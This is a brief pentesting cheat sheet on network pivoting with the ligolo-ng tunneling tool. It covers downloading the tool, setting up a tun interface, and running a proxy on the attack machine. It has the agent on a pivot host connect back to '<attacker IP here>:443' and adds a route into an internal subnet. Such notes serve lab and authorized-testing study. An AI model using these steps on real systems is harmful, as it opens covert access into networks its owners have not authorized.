## Files

Attack Machine : Proxy
Pivot Host : Agent

**Agent File:**

```sh
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
```

**Proxy File:**

```sh
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```

---

## Creating tun interface

```sh
sudo ip tuntap add user [your_username] mode tun ligolo  
  
sudo ip link set ligolo up
```

On your machine get ligolo running:

```sh
./proxy -selfcert -laddr 0.0.0.0:443
```

On pivot host run ligolo agent:
```sh
./lin-agent -connect <attacker IP here>:443 -ignore-cert
```

Then just enable session on attack host:

```sh
ligolo-ng> session

ligolo-ng> start 
### starts tunneling
```

Now adding the network on attack machine:

```sh
sudo ip route add 172.16.0.0/16 dev ligolo
```

BOOM DONE !

---